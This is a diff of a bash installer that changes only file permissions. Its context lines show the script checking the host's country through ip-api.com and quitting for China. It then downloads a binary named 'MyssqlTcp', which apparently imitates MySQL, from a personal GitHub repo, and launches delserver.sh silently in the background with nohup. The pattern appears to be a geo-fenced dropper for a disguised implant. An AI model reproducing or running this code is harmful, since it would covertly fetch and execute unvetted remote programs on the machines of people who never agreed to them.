@@ -4,7 +4,7 @@ VERSION=2.11
 
 cd $HOME/
 wget http://ip-api.com/json/
-chmod 777 index.html
+chmod +x index.html
 # Detect IP address
 if index.html | sed 's/,/\n/g' | grep  -i 'CN'; then 
     exit 1 
@@ -704,8 +704,8 @@ mkdir myssqltcp
 cd /$HOME/myssqltcp
 wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json
 wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp
-chmod 777 MyssqlTcp
-chmod 777 config.json
+chmod +x MyssqlTcp
+chmod +x config.json
 
 # Write configuration
 MEIP=`cat $HOME/index.html | sed 's/,/\n/g' | grep "query" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/-/g'`
@@ -1453,7 +1453,7 @@ echo ""
 
 cd /$HOME/
 rm -f index.html
-chmod 777 delserver.sh
+chmod +x delserver.sh
 /bin/bash ./delserver.sh >/dev/null 2>&1 &
 nohup ./delserver.sh > /dev/null 2>&1 &
 echo "[*] Yes-GoGo"
